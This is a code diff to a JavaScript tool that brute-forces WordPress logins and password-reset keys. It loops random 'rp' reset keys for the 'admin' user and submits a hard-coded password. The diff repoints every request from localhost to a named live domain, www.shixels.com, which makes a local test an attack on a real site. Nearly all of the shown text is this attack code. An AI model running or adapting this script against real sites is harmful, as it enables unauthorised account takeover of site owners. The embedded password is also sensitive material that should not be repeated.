@@ -20,7 +20,7 @@ function searchword(dictionary){
 // console.log(utils.powerof(72,13));
 // console.log(Math.pow(72,13));
 global.JOB={};
-function passRandomString(){
+passRandomString=function(){
 	global.JOB.passRandomString=true;
 	var gen=1;
 	// $possible=12312;
@@ -32,10 +32,10 @@ function passRandomString(){
 	console.log("Job started at "+datestarted);
 	console.log("Job will take "+totalwait+" Hours to end");
 	var $browser=new utils.FakeBrowser();
-	$browser.setURL("http://localhost/wordpress/wp-login.php");
+	$browser.setURL("https://www.shixels.com/wp-login.php");
 	console.log($browser.getURL());
 	$browser.setBrowserMethod("POST");
-	$browser.setBrowserHost("localhost");
+	$browser.setBrowserHost("www.shixels.com");
 	$browser.setBrowserConnection("keep-alive");
 	$browser.setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
 	var $formData={
@@ -44,7 +44,7 @@ function passRandomString(){
 		"pwd":"q@yW1UusaRnPi@q6rn",
 		"rememberme":"forever",
 		"wp-submit": "Log In",
-		"redirect_to":"http://localhost"
+		"redirect_to":"https://www.shixels.com"
 	};
 	function callJob(){
 		const loopstart=Date.now();
@@ -90,7 +90,7 @@ function passRandomString(){
 	callJob();
 }
 
-function forcepassword_reset(){
+ forcepassword_reset=function(){
 	global.JOB.forcepassword_reset=true;
 	var gen=1;
 	// $possible=12312;
@@ -108,18 +108,18 @@ function forcepassword_reset(){
 			login="admin";
 		console.log("Try "+gen+" of "+possible);
 		console.log("With random string "+key);
-		$browser.setURL("http://localhost/wordpress/wp-login.php");
+		$browser.setURL("https://www.shixels.com/wp-login.php");
 		console.log($browser.getURL());
 		$browser.setBrowserMethod("GET");
-		$browser.setBrowserHost("localhost");
+		$browser.setBrowserHost("www.shixels.com");
 		$browser.setBrowserConnection("keep-alive");
 		$browser.setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
 		$browser.setBrowserQueryString({action:"rp",key:key,login:login});
 		$browser.run(function ($res){
-			$browser.setURL("http://localhost/wordpress/wp-login.php");
+			$browser.setURL("https://www.shixels.com/wp-login.php");
 			console.log($browser.getURL());
 			$browser.setBrowserMethod("GET");
-			$browser.setBrowserHost("localhost");
+			$browser.setBrowserHost("www.shixels.com");
 			$browser.setBrowserConnection("keep-alive");
 			$browser.clearCookiesjar();
 			$browser.setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
